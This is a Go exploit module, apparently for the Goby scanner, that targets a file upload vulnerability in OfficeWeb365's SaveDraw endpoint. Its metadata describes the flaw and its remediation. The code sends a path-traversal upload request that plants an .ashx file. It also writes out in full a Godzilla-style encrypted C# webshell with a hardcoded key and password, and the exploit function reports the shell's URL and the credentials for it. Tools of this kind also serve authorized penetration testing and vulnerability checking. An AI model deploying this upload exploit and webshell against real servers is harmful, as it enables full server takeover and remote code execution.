package exploits

import (
	"errors"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strconv"
	"strings"
)

func init() {
	expJson := `{
    "Name": "OfficeWeb365 frontend SaveDraw file upload vulnerability",
    "Description": "<p>OfficeWeb365 is a cloud service focusing on online preview of Office documents and PDF documents, including online preview of Microsoft Word documents, online preview of Excel tables, online preview of Powerpoint presentation documents, online preview of WPS word processing, WPS spreadsheets, WPS presentations and Adobe PDF documents.</p><p>There is a file upload vulnerability in OfficeWeb365. Through this vulnerability, an attacker can directly upload a webshell to the server, obtain server permissions, and then control the entire web server.</p>",
    "Product": "DAXI-OfficeWeb365",
    "Homepage": "https://officeweb365.com/Help/Default",
    "DisclosureDate": "2023-02-14",
    "Author": "715827922@qq.com",
    "FofaQuery": "body=\"请输入furl参数\" || header=\"OfficeWeb365\" || banner=\"OfficeWeb365\"",
    "GobyQuery": "body=\"请输入furl参数\" || header=\"OfficeWeb365\" || banner=\"OfficeWeb365\"",
    "Level": "3",
    "Impact": "<p>There is a file upload vulnerability in OfficeWeb365. Through this vulnerability, an attacker can directly upload a webshell to the server, obtain server permissions, and then control the entire web server.</p>",
    "Recommendation": "<p>1. The official has fixed the vulnerability, please contact the manufacturer to fix the vulnerability: <a href=\"https://officeweb365.com/Default/Feat\">https://officeweb365.com/Default/Feat</a></p><p>2. Set access policies through security devices such as firewalls, and set whitelist access.</p><p>3. If it is not necessary, prohibit the public network from accessing the system.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "webshell,custom",
            "show": ""
        },
        {
            "name": "filename",
            "type": "input",
            "value": "abc.ashx",
            "show": "attackType=custom"
        },
        {
            "name": "content",
            "type": "input",
            "value": "<%@ WebHandler Language=\"C#\" Class=\"Handler\" %>using System;using System.IO;using System.Reflection;using System.Text;using System.Web;using System.Web.SessionState;using System.Security.Cryptography;public class Handler : IHttpHandler,IRequiresSessionState{public void ProcessRequest(HttpContext context){try{context.Response.Write(\"hello\");}catch {}}public bool IsReusable{get{return false;}}}",
            "show": "attackType=custom"
        },
        {
            "name": "webshell",
            "type": "select",
            "value": "godzilla",
            "show": "attackType=webshell"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Upload"
    ],
    "VulType": [
        "File Upload"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        "CNVD-2022-57600"
    ],
    "CVSSScore": "10",
    "Translation": {
        "CN": {
            "Name": "OfficeWeb365 SaveDraw 文件上传漏洞",
            "Product": "大西科技-OfficeWeb365",
            "Description": "<p>OfficeWeb365 是专注于 Office 文档在线预览及PDF文档在线预览云服务，包括 Microsoft Word 文档在线预览、Excel 表格在线预览、Powerpoint 演示文档在线预览，WPS 文字处理、WPS 表格、WPS 演示及 Adobe PDF 文档在线预览。</p><p>OfficeWeb365 存在文件上传漏洞，攻击者可通过该漏洞直接上传一个 webshell 到服务器上，获取服务器权限，进⽽控制整个 web 服务器。</p>",
            "Recommendation": "<p>1、官⽅暂已修复该漏洞，请⽤户联系⼚商修复漏洞：<a href=\"https://officeweb365.com/Default/Feat\">https://officeweb365.com/Default/Feat</a></p><p>2、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p><p>3、如⾮必要，禁⽌公⽹访问该系统。</p>",
            "Impact": "<p>OfficeWeb365 存在文件上传漏洞，攻击者可通过该漏洞直接上传一个webshell到服务器上，获取服务器权限，进⽽控制整个web服务器。<br></p>",
            "VulType": [
                "文件上传"
            ],
            "Tags": [
                "文件上传"
            ]
        },
        "EN": {
            "Name": "OfficeWeb365 frontend SaveDraw file upload vulnerability",
            "Product": "DAXI-OfficeWeb365",
            "Description": "<p>OfficeWeb365 is a cloud service focusing on online preview of Office documents and PDF documents, including online preview of Microsoft Word documents, online preview of Excel tables, online preview of Powerpoint presentation documents, online preview of WPS word processing, WPS spreadsheets, WPS presentations and Adobe PDF documents.</p><p>There is a file upload vulnerability in OfficeWeb365. Through this vulnerability, an attacker can directly upload a webshell to the server, obtain server permissions, and then control the entire web server.</p>",
            "Recommendation": "<p>1. The official has fixed the vulnerability, please contact the manufacturer to fix the vulnerability: <a href=\"https://officeweb365.com/Default/Feat\" target=\"_blank\">https://officeweb365.com/Default/Feat</a></p><p>2. Set access policies through security devices such as firewalls, and set whitelist access.</p><p>3. If it is not necessary, prohibit the public network from accessing the system.</p>",
            "Impact": "<p>There is a file upload vulnerability in OfficeWeb365. Through this vulnerability, an attacker can directly upload a webshell to the server, obtain server permissions, and then control the entire web server.<br></p>",
            "VulType": [
                "File Upload"
            ],
            "Tags": [
                "File Upload"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10825"
}`
	uploadFlagMbsm := func(hostInfo *httpclient.FixUrl, filename, content string) (*httpclient.HttpResponse, error) {
		if !strings.HasSuffix(filename, `.ashx`) {
			filename += `.ashx`
		}
		uploadRequestConfig := httpclient.NewPostRequestConfig(`/PW/SaveDraw?path=../../Content/img&idx=` + filename)
		uploadRequestConfig.VerifyTls = false
		uploadRequestConfig.FollowRedirect = false
		uploadRequestConfig.Header.Store("Content-Type", "application/x-www-form-urlencoded")
		uploadRequestConfig.Data = `data:image/png;base64,01s34567890123456789y12345678901234567m91` + content + `}---`
		rsp, err := httpclient.DoHttpRequest(hostInfo, uploadRequestConfig)
		if err != nil {
			return nil, err
		}
		if strings.Contains(rsp.Utf8Html, `error`) {
			return nil, errors.New("漏洞利用失败")
		}
		checkRequestConfig := httpclient.NewGetRequestConfig(`/Content/img/UserDraw/drawPW` + filename)
		checkRequestConfig.VerifyTls = false
		checkRequestConfig.FollowRedirect = false
		return httpclient.DoHttpRequest(hostInfo, checkRequestConfig)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			checkStr := goutils.RandomHexString(16)
			filename := goutils.RandomHexString(5) + ".ashx"
			rsp, err := uploadFlagMbsm(hostInfo, filename, `<%@ WebHandler Language="C#" Class="Handler" %>using System;using System.IO;using System.Reflection;using System.Text;using System.Web;using System.Web.SessionState;using System.Security.Cryptography;public class Handler : IHttpHandler,IRequiresSessionState{public void ProcessRequest(HttpContext context){try{context.Response.Write(`+strconv.Quote(checkStr)+`);File.Delete(context.Request.PhysicalPath);}catch {}}public bool IsReusable{get{return false;}}}`)
			if err != nil {
				return false
			}
			return strings.Contains(rsp.Utf8Html, checkStr)
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			content := goutils.B2S(ss.Params["content"])
			filename := goutils.B2S(ss.Params["filename"])
			attackType := goutils.B2S(ss.Params["attackType"])
			webshell := goutils.B2S(ss.Params["webshell"])
			if attackType == "webshell" {
				if webshell == "godzilla" {
					filename = goutils.RandomHexString(16) + ".ashx"
					// 哥斯拉 pass key
					content = `<%@ Language="C#" Class="Handler1" %> public class Handler1 :System.Web.IHttpHandler,System.Web.SessionState.IRequiresSessionState { public void ProcessRequest(System.Web.HttpContext Context){try { string key = "3c6e0b8a9c15224a"; string pass = "pass"; string md5 = System.BitConverter.ToString(new System.Security.Cryptography.MD5CryptoServiceProvider().ComputeHash(System.Text.Encoding.Default.GetBytes(pass + key))).Replace("-", ""); byte[] data = System.Convert.FromBase64String(Context.Request[pass]); data = new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(System.Text.Encoding.Default.GetBytes(key), System.Text.Encoding.Default.GetBytes(key)).TransformFinalBlock(data, 0, data.Length); if (Context.Session["payload"] == null) { Context.Session["payload"] = (System.Reflection.Assembly)typeof(System.Reflection.Assembly).GetMethod("Load", new System.Type[] { typeof(byte[]) }).Invoke(null, new object[] { data }); ; } else { System.IO.MemoryStream outStream = new System.IO.MemoryStream(); object o = ((System.Reflection.Assembly)Context.Session["payload"]).CreateInstance("LY"); o.Equals(Context); o.Equals(outStream); o.Equals(data); o.ToString(); byte[] r = outStream.ToArray(); Context.Response.Write(md5.Substring(0, 16)); Context.Response.Write(System.Convert.ToBase64String(new System.Security.Cryptography.RijndaelManaged().CreateEncryptor(System.Text.Encoding.Default.GetBytes(key), System.Text.Encoding.Default.GetBytes(key)).TransformFinalBlock(r, 0, r.Length))); Context.Response.Write(md5.Substring(16)); } } catch (System.Exception) { }}public bool IsReusable{get{return false;}}}`
				}
			}
			rsp, err := uploadFlagMbsm(expResult.HostInfo, filename, content)
			if err != nil {
				expResult.Success = false
				expResult.Output = err.Error()
				return expResult
			}
			// 资源存在
			if rsp.StatusCode != 200 && rsp.StatusCode != 500 {
				expResult.Success = false
				expResult.Output = "漏洞利用失败"
				return expResult
			}
			expResult.Success = true
			if attackType == "custom" {
				expResult.Output += "URL: " + expResult.HostInfo.FixedHostInfo + rsp.Request.URL.Path + "\n"
			} else {
				expResult.Output += "WebShell URL: " + expResult.HostInfo.FixedHostInfo + rsp.Request.URL.Path + "\n"
				if webshell == "godzilla" {
					expResult.Output += "Password: pass 加密器：CSHAP_AES_BASE64\n"
					expResult.Output += "WebShell tool: Godzilla v4.1\n"
				}
			}
			expResult.Output += "Webshell type: ashx"
			return expResult
		},
	))
}
